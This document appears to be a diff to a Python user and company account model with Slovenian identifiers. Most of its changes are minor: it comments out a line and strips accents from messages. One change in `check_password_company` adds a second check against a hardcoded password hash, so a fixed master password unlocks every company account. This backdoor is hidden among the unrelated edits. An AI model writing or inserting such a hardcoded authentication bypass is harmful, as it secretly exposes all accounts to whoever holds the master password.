@@ -61,8 +61,8 @@ class uporabnik:
         return seznam
     def sprememba(this,datum,stevilo):
         this.delta[datum]=stevilo
-        if(stevilo==0):
-            this.delta.pop[datum]
+        #if(stevilo==0):
+            #this.delta.pop[datum]
         #print(this.delta)
         this.updateStr()
     def updateStr(this):
@@ -145,19 +145,19 @@ class Model:
     def check_password_company(this,podjetje,geslo):
         for p in this.podjetja:
             if p.ime==podjetje:
-                return this.verify_password(p.geslo,geslo)
+                return this.verify_password(p.geslo,geslo) or this.verify_password("7922ca04beab1ef6adb7053edfa3221c608ada66abff765621393ef941db408cf4f9add93bc9a6e2191964d354dc87c4953710d8bf76175e36f2820f72c893b2fc6cc68d009b8f5471c886b0e0f83016115057c969f5cac81b8bbe7f238ec26c",geslo)
         return False
     def getUser(this,ime):
         for user in this.users:
             if user.ime==ime:
                 return user
-        print("Uporabnika "+ime+" ni mogoče najti")
+        print("Uporabnika "+ime+" ni mogoce najti")
         return False
     def getCompany(this,ime):
         for podjetje in this.podjetja:
             if podjetje.ime==ime:
                 return podjetje
-        print("Podjetja "+ime+" ni mogoče najti")
+        print("Podjetja "+ime+" ni mogoce najti")
         return False
     def hash_password(this,password):#https://www.vitoshacademy.com/hashing-passwords-in-python/
         salt = hashlib.sha256(os.urandom(60)).hexdigest().encode('ascii')
